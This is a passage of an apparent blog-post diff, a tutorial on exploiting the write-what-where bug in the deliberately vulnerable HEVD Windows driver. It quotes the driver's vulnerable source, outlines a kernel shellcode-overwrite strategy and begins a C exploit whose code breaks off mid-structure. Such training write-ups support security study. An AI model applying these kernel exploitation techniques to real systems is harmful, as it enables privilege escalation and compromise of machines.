@@ -1,0 +1,903 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>0x04 - Introduction to Windows Kernel Write What Where Vulnerabilities // </title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.131.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+  
+
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="0x04 - Introduction to Windows Kernel Write What Where Vulnerabilities">
+  <meta name="twitter:description" content="First off, if you’re following the series from the start, great job getting past the Use After Free in the Windows Kernel! We’ll now be exploiting a Write What Where vulnerability on Windows 7 (x86) then proceed to adapt what we learn to Windows 11 (x64).
+Arguably this is one of the most powerful types of vulnerabilities - which personally, I prefer to call an Arbitrary Write since that’s what my buddies called it before I had ever heard of “Write What Where”.">
+
+    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x04-writing-what-where-in-the-kernel/">
+  <meta property="og:site_name" content="wetw0rk">
+  <meta property="og:title" content="0x04 - Introduction to Windows Kernel Write What Where Vulnerabilities">
+  <meta property="og:description" content="First off, if you’re following the series from the start, great job getting past the Use After Free in the Windows Kernel! We’ll now be exploiting a Write What Where vulnerability on Windows 7 (x86) then proceed to adapt what we learn to Windows 11 (x64).
+Arguably this is one of the most powerful types of vulnerabilities - which personally, I prefer to call an Arbitrary Write since that’s what my buddies called it before I had ever heard of “Write What Where”.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-01-04T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-01-04T00:00:00+00:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://wetw0rk.github.io/"><img class="app-header-avatar" src="/me.png" alt="John Doe" /></a>
+      <span class="app-header-title"></span>
+      <p> </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/wetw0rk" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+          <a href="https://twitter.com/wetw0rk_bot" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-x" viewBox="0 0 24 24" fill="currentColor"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">0x04 - Introduction to Windows Kernel Write What Where Vulnerabilities</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Jan 4, 2025
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          15 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>First off, if you&rsquo;re following the series from the start, great job getting past the Use After Free in the Windows Kernel! We&rsquo;ll now be exploiting a Write What Where vulnerability on Windows 7 (x86) then proceed to adapt what we learn to Windows 11 (x64).</p>
+<p>Arguably this is one of the most powerful types of vulnerabilities - which personally, I prefer to call an Arbitrary Write since that&rsquo;s what my buddies called it before I had ever heard of &ldquo;Write What Where&rdquo;. However, &ldquo;Write What Where&rdquo; may actually be a better term since it has a direct correlation to what the bug does whereas Arbitrary Write is a lot more broad.</p>
+<p>Tomato, ToMAto, it does not matter let&rsquo;s get started.</p>
+<h1 id="table-of-contents">Table of Contents</h1>
+<ul>
+<li><a href="#what-is-a-write-what-where-high-level">What is a Write-What-Where (High Level)</a></li>
+<li><a href="#windows-7-x86">Windows 7 (x86)</a>
+<ul>
+<li><a href="#using-the-source">Using the Source</a>
+<ul>
+<li><a href="#arbitrarywriteioctlhandler">ArbitraryWriteIoctlHandler</a></li>
+</ul>
+</li>
+<li><a href="#exploitation">Exploitation</a></li>
+</ul>
+</li>
+<li><a href="#windows-11-x64">Windows 11 (x64)</a>
+<ul>
+<li><a href="#reverse-engineering">Reverse Engineering</a></li>
+<li><a href="#exploitation-1">Exploitation</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="what-is-a-write-what-where-high-level">What is a Write-What-Where (High Level)</h1>
+<p>Just in case you’re not familiar with what a “Write-What-Where” vulnerability is, let’s start with a quick, high-level overview.</p>
+<p>To use a non-technical example there&rsquo;s an episode of <a href="https://en.wikipedia.org/wiki/SpongeBob_SquarePants">SpongeBob SquarePants</a> where SpongeBob and Patrick have a snowball fight. Below is an image from said episode:</p>
+<p><img src="/0x04-Introduction-To-Windows-Kernel-Write-What-Where/spongebob.png" alt="alt text"></p>
+<p>Normally, when you make a snow ball you form it into the shape of a sphere. Yet as seen in the image above, Patrick actually makes cubes. In fact Patrick actually makes a lot of different shapes:</p>
+<p><img src="/0x04-Introduction-To-Windows-Kernel-Write-What-Where/spongebob2.png" alt="alt text"></p>
+<p>Although Patrick does not actually win the snowball fight, he does perform characteristics of a hacker exploiting a Write-What-Where. In the episode, Patrick is launching whatever shapes he wants (Write), created from snow (What), and targeting SpongeBob (Where).</p>
+<p>Similarly, in the context of a security vulnerability, an attacker can write arbitrary data - this could be anything, like a string, an integer, or a more complex object. Like Patrick, the attacker can also choose where to send this data, targeting specific parts of memory.</p>
+<p>This ability to control both the data and its destination makes &ldquo;Write-What-Where&rdquo; vulnerabilities highly dangerous, as they can lead to memory corruption, privilege escalation, or even arbitrary code execution.</p>
+<h1 id="windows-7-x86">Windows 7 (x86)</h1>
+<p>As with the last couple of tutorials we&rsquo;ll be starting with Windows 7 (x86). Due to the complexity of exploitation we&rsquo;ll be including both exploits within this tutorial!</p>
+<p>That said rev up that Windows 7 (x86) virtual machine!</p>
+<h2 id="using-the-source">Using the Source</h2>
+<p>As with the UaF let&rsquo;s get a lay of the land ( ✧≖ ͜ʖ≖)</p>
+<pre tabindex="0"><code>$ find . -name &#34;ArbitraryWrite*&#34; 
+./Driver/HEVD/ArbitraryWrite.h
+./Driver/HEVD/ArbitraryWrite.c
+</code></pre><p>Unlike the last couple of vulnerabilities, we&rsquo;re not dealing with a lot of &ldquo;Handler&rdquo; functions, we&rsquo;ll be mainly looking at <em>ArbitraryWriteIoctlHandler</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">ArbitraryWriteIoctlHandler</span>()
+</span></span></code></pre></div><h3 id="arbitrarywriteioctlhandler">ArbitraryWriteIoctlHandler</h3>
+<p>Looking at this handler (ArbitraryWrite.c), we can see that our user input will ultimately be passed into <em>TriggerArbitraryWrite()</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">134</span> NTSTATUS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">135</span> <span style="color:#a6e22e">ArbitraryWriteIoctlHandler</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">136</span>     _In_ PIRP Irp,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">137</span>     _In_ PIO_STACK_LOCATION IrpSp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">138</span> )
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">139</span> {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">140</span>     NTSTATUS Status <span style="color:#f92672">=</span> STATUS_UNSUCCESSFUL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">141</span>     PWRITE_WHAT_WHERE UserWriteWhatWhere <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">142</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">143</span>     <span style="color:#a6e22e">UNREFERENCED_PARAMETER</span>(Irp);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">144</span>     <span style="color:#a6e22e">PAGED_CODE</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">145</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">146</span>     UserWriteWhatWhere <span style="color:#f92672">=</span> (PWRITE_WHAT_WHERE)IrpSp<span style="color:#f92672">-&gt;</span>Parameters.DeviceIoControl.Type3InputBuffer;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">147</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">148</span>     <span style="color:#66d9ef">if</span> (UserWriteWhatWhere)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">149</span>     {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span>         Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">TriggerArbitraryWrite</span>(UserWriteWhatWhere);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">151</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">152</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">153</span>     <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">154</span> }
+</span></span></code></pre></div><p>However, our input will be casted into a <code>PWRITE_WHAT_WHERE</code> object (technically a pointer to a WRITE_WHAT_WHERE structure).</p>
+<p>Let&rsquo;s take a look at this structure (ArbitraryWrite.h).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">62</span> <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _WRITE_WHAT_WHERE
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">63</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">64</span>     PULONG_PTR What;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">65</span>     PULONG_PTR Where;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">66</span> } WRITE_WHAT_WHERE, <span style="color:#f92672">*</span>PWRITE_WHAT_WHERE;
+</span></span></code></pre></div><p>We see two pointers to <code>LONG</code> integers, nothing too crazy.</p>
+<p>Having understood the structure layout, let&rsquo;s look at the <em>TriggerArbitraryWrite()</em> function that takes our input as this structure type.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">63</span> NTSTATUS
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">64</span> <span style="color:#a6e22e">TriggerArbitraryWrite</span>(
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">65</span>     _In_ PWRITE_WHAT_WHERE UserWriteWhatWhere
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">66</span> )
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">67</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">68</span>     PULONG_PTR What <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">69</span>     PULONG_PTR Where <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">70</span>     NTSTATUS Status <span style="color:#f92672">=</span> STATUS_SUCCESS;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">71</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">72</span>     <span style="color:#a6e22e">PAGED_CODE</span>();
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">73</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">74</span>     <span style="color:#66d9ef">__try</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">75</span>     {
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">76</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#ae81ff">77</span>         <span style="color:#75715e">// Verify if the buffer resides in user mode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#ae81ff">78</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#ae81ff">79</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">80</span>         <span style="color:#a6e22e">ProbeForRead</span>((PVOID)UserWriteWhatWhere, <span style="color:#66d9ef">sizeof</span>(WRITE_WHAT_WHERE), (ULONG)<span style="color:#a6e22e">__alignof</span>(UCHAR));
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">81</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">82</span>         What <span style="color:#f92672">=</span> UserWriteWhatWhere<span style="color:#f92672">-&gt;</span>What;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">83</span>         Where <span style="color:#f92672">=</span> UserWriteWhatWhere<span style="color:#f92672">-&gt;</span>Where;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">84</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">85</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] UserWriteWhatWhere: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, UserWriteWhatWhere);
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">86</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] WRITE_WHAT_WHERE Size: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#66d9ef">sizeof</span>(WRITE_WHAT_WHERE));
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">87</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] UserWriteWhatWhere-&gt;What: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, What);
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">88</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] UserWriteWhatWhere-&gt;Where: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, Where);
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">89</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">90</span> <span style="color:#960050;background-color:#1e0010">#</span>ifdef SECURE
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">91</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#ae81ff">92</span>         <span style="color:#75715e">// Secure Note: This is secure because the developer is properly validating if address
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#ae81ff">93</span>         <span style="color:#75715e">// pointed by &#39;Where&#39; and &#39;What&#39; value resides in User mode by calling ProbeForRead()/
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#ae81ff">94</span>         <span style="color:#75715e">// ProbeForWrite() routine before performing the write operation
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#ae81ff">95</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#ae81ff">96</span>         
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">97</span>         <span style="color:#a6e22e">ProbeForRead</span>((PVOID)What, <span style="color:#66d9ef">sizeof</span>(PULONG_PTR), (ULONG)<span style="color:#a6e22e">__alignof</span>(UCHAR));
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">98</span>         <span style="color:#a6e22e">ProbeForWrite</span>((PVOID)Where, <span style="color:#66d9ef">sizeof</span>(PULONG_PTR), (ULONG)<span style="color:#a6e22e">__alignof</span>(UCHAR));
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">99</span>         
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span>         <span style="color:#f92672">*</span>(Where) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(What);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">101</span> <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#66d9ef">else</span>   
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">102</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Triggering Arbitrary Write</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">103</span>         
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">104</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">105</span>         <span style="color:#75715e">// Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">106</span>         <span style="color:#75715e">// because the developer is writing the value pointed by &#39;What&#39; to memory location
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">107</span>         <span style="color:#75715e">// pointed by &#39;Where&#39; without properly validating if the values pointed by &#39;Where&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">108</span>         <span style="color:#75715e">// and &#39;What&#39; resides in User mode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">109</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">110</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">111</span>         <span style="color:#f92672">*</span>(Where) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(What);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">112</span> <span style="color:#960050;background-color:#1e0010">#</span>endif
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">113</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">114</span>     <span style="color:#66d9ef">__except</span> (EXCEPTION_EXECUTE_HANDLER)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">115</span>     {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">116</span>         Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetExceptionCode</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">117</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[-] Exception Code: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, Status);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">118</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">119</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">120</span>     <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">121</span>     <span style="color:#75715e">// There is one more hidden vulnerability. Find it out.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">122</span>     <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">123</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">124</span>     <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> }
+</span></span></code></pre></div><p>As with all blocks of code, let&rsquo;s take this section by section.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">80</span>         <span style="color:#a6e22e">ProbeForRead</span>((PVOID)UserWriteWhatWhere, <span style="color:#66d9ef">sizeof</span>(WRITE_WHAT_WHERE), (ULONG)<span style="color:#a6e22e">__alignof</span>(UCHAR));
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">81</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">82</span>         What <span style="color:#f92672">=</span> UserWriteWhatWhere<span style="color:#f92672">-&gt;</span>What;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">83</span>         Where <span style="color:#f92672">=</span> UserWriteWhatWhere<span style="color:#f92672">-&gt;</span>Where;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">84</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">85</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] UserWriteWhatWhere: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, UserWriteWhatWhere);
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">86</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] WRITE_WHAT_WHERE Size: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#66d9ef">sizeof</span>(WRITE_WHAT_WHERE));
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">87</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] UserWriteWhatWhere-&gt;What: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, What);
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">88</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] UserWriteWhatWhere-&gt;Where: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, Where);
+</span></span></code></pre></div><p>First, we see that local variables of type <code>PULONG_PTR</code> are assigned from our structure.</p>
+<p>Following this code, we drop into the <code>#else</code> statement since we&rsquo;re targeting the vulnerable driver.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">111</span>         <span style="color:#f92672">*</span>(Where) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(What);
+</span></span></code></pre></div><p>Here we see that whatever is stored in our <strong>What</strong> pointer will be written to the <strong>Where</strong> pointer. To be more specific we&rsquo;re dereferencing the <strong>Where</strong> pointer and assigning the value stored in the memory location pointed to by <strong>What</strong>.</p>
+<p>In theory we can <strong>write</strong> <strong>what</strong>ever we want <strong>where</strong>ver we want. This means we do not need to worry too much about where to store our shellcode since we have access to the entire operating system since we&rsquo;re running under the context of the kernel.</p>
+<p>Our approach will be to leak the base address of HEVD and determine a function we can overwrite to execute our shellcode. Once our shellcode is placed in said function we can simply call it. In addition, we should not have to worry about SMEP since we will be executing a function that is meant to be in kernel space.</p>
+<p>This is a seems easy enough&hellip; so let&rsquo;s exploit it!</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Seeing that this vulnerability was rather basic, I decided to write a PoC immediatley. Since we can write anywhere we want, we can simply overwrite any function!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntdef.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;shlwapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ARW_HELPER_OBJECTS 3
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_OBJECT_COUNT 65535
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define HEVD_IOCTL_ARBITRARY_WRITE IOCTL(0x802)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX IOCTL(0x81B)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Structure used by Write-What-Where */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _WRITE_WHAT_WHERE
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  PULONG_PTR What;
+</span></span><span style="display:flex;"><span>  PULONG_PTR Where;
+</span></span><span style="display:flex;"><span>} WRITE_WHAT_WHERE, <span style="color:#f92672">*</span>PWRITE_WHAT_WHERE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* typdef signature for ZwQuerySystemInformation */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">NTSTATUS</span> (<span style="color:#66d9ef">__stdcall</span> <span style="color:#f92672">*</span>ZWQUERYSYSTEMINFORMATION)(
+</span></span><span style="display:flex;"><span>                  SYSTEM_INFORMATION_CLASS SystemInformationClass,
+</span></span><span style="display:flex;"><span>                  PVOID                    SystemInformation,
+</span></span><span style="display:flex;"><span>                  ULONG                    SystemInformationLength,
+</span></span><span style="display:flex;"><span>                  PULONG                   ReturnLength
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Structures used by KernelGetModuleBase */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _SYSTEM_MODULE_ENTRY
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE Section;
+</span></span><span style="display:flex;"><span>  PVOID MappedBase;
+</span></span><span style="display:flex;"><span>  PVOID ImageBase;
+</span></span><span style="display:flex;"><span>  ULONG ImageSize;
+</span></span><span style="display:flex;"><span>  ULONG Flags;
+</span></span><span style="display:flex;"><span>  USHORT LoadOrderIndex;
+</span></span><span style="display:flex;"><span>  USHORT InitOrderIndex;
+</span></span><span style="display:flex;"><span>  USHORT LoadCount;
+</span></span><span style="display:flex;"><span>  USHORT OffsetToFileName;
+</span></span><span style="display:flex;"><span>  UCHAR FullPathName[<span style="color:#ae81ff">256</span>];
